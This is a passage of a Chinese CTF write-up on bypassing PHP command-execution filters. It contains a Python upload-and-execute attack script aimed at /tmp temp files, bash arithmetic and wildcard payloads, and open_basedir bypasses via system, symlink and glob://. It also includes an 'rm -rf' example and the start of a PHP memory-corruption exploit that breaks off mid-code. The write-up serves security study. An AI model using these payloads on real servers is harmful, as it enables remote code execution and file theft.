class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST文件上传<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://c43f906f-d199-40d1-b9b1-c968fbbb0d3c.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后对文件内容进行修改，改成sh脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在shell中可以使用. sh脚本，来运行文件，并且PHP会自动将上传的文件放到临时文件&#x2F;tmp&#x2F;php?????[A-Z],（shell中除了？*等通配符，还可以使用[0-9]等写法）</p><p>因此</p><p>上传文件的同时使用传参<code>?c=.%20/???/????????[@-[]</code>，执行脚本</p><p><img src="/images/image-20220807205152159-1662567433523.png" alt="image-20220807205152159"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#攻击脚本，可能要多执行几次，因为有可能临时文件被删了</span><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://c43f906f-d199-40d1-b9b1-c968fbbb0d3c.challenge.ctf.show/?c=.%20/???/????????[@-[]'</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token triple-quoted-string string">b'''    #!/bin/sh        cat flag.php'''</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220807211246198-1662567433523.png" alt="image-20220807211246198"></p><h2 id="shell中的数组构造"><a href="#shell中的数组构造" class="headerlink" title="shell中的数组构造"></a>shell中的数组构造</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in 36.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat "</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 过滤了. 学到了一种新的方法：$(())&#x3D;0 $((<del>$(())))&#x3D;-1 $((</del>$(($((<del>$(())))+$((</del>$(())))))))&#x3D;1</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果禁用了命令执行函数：</p><p>1、<code>c=var_dump(scandir(&#39;.&#39;));</code>查看目录</p><p>2、<code>c=echo file_get_contents(&#39;flag.php&#39;);</code>也可以使用include、show_source等+伪协议</p><p>exit(0)截止执行后面的程序</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>//c=include('/flag.txt');exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PHP之如何绕过open-basedir"><a href="#PHP之如何绕过open-basedir" class="headerlink" title="PHP之如何绕过open_basedir"></a>PHP之如何绕过open_basedir</h2><p> <a href="https://blog.csdn.net/qq_32393893/article/details/110240955">https://blog.csdn.net/qq_32393893/article/details/110240955</a> </p><p>绕过方法<br>1，命令执行函数绕过<br>open_basedir的设置对system等命令执行函数是无效的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rm -rf ../1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat ../1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2,symlink()函数<br>菜鸟：symlink（）函数创建一个从指定名称连接的现存目标文件开始的符号连接。如果成功，该函数返回TRUE。如果失败，则返回FALSE。</p><p>官方：symlink ( string $target , string $link ) : bool</p><p>symlink() 对于已有的 target 建立一个名为 link 的符号连接。</p><p>target： 连接的目标。link：连接的名称。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$target</span><span class="token operator">=</span><span class="token string single-quoted-string">'uploads.php'</span><span class="token variable">$link</span><span class="token operator">=</span><span class="token string single-quoted-string">'uploads'</span><span class="token function">symlink</span><span class="token punctuation">(</span><span class="token variable">$target</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"readlink(<span class="token interpolation"><span class="token variable">$link</span></span>)"</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>readlink() 函数返回符号连接指向的目标。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注释：这不是一个HTML连接，而是一个文件系统中的连接。</p><p>注释：该函数不能在Windows平台上执行。</p><p>利用方式：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">symlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"c/d"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"tmplink"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//建立一个符号连接指向c/d,c/d是之前建立的目录文件</span>        <span class="token function">symlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tmplink/../../1.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"exploit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这个时候tmplink是符号链接文件，它指向的路径是c/d，因此这个时候exploit这个符号链接文件指向的</span>路径是：c<span class="token operator">/</span>d<span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token number">1.</span>txt，<span class="token operator">.</span><span class="token operator">.</span>是在d目录下新建的目录，符合open_basedir的范围要求，所以建立成立。        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tmplink"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除了符号链接。</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tmplink"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//然后新建了tmplink目录，这就导致exploit指向的路径变成了tmplink/../../，在tmplink目录下向上跳了一个目录。</span>        <span class="token keyword">echo</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"http://127.0.0.1/exploit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这个地方调用了符号链接exploit,读取到了上一次目录下的1.txt</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3，glob伪协议<br>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</p><p>基本用法</p><p>绕过open_basedir()</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"glob:///var/www/test/*.txt"</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"filename:"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>opendir() 函数:打开目录句柄。</p><p>readdir（）函数返回目录中下一个文件的文件名。<br>所以payload：<code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;); foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();</code>扫描目录</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">#利用脚本<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>             <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span 